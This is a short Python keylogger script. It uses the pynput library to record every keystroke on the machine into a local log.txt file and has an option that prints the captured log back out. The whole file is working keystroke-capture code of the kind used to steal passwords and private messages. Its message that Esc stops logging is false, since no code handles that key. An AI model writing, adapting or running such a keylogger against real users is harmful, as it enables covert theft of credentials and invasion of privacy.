from pynput.keyboard import Key, Listener

def log_key(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = ""
    with open("log.txt", 'a') as log_file:
        log_file.write(key)

def start_logging():
    with Listener(on_press=log_key) as listener:
        listener.join()

def read_keylog():
    try:
        with open("log.txt", "r") as log_file:
            return log_file.read()
    except FileNotFoundError:
        return "Log file not found"

if __name__ == "__main__":
    action = input("Enter 'start' to start logging or 'read' to view logs: ").strip().lower()
    if action == "start":
        print("Keylogger Started... (Press 'Esc' to stop)")
        start_logging()
    elif action == "read":
        print(read_keylog())
    else:
        print("Invalid action")